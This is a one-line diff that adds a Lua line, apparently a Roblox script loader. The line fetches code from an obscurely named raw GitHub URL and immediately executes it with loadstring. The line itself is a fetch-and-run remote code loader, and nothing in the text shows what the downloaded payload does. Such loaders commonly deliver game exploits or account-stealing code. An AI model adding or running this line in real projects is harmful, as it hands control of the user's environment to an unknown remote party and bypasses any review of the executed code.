@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Impactor9000/aEjgfOq3JIf83/249ddc3acaa36ef0e23913babb8bab99a9653ca8/fhas92JKHs'))()
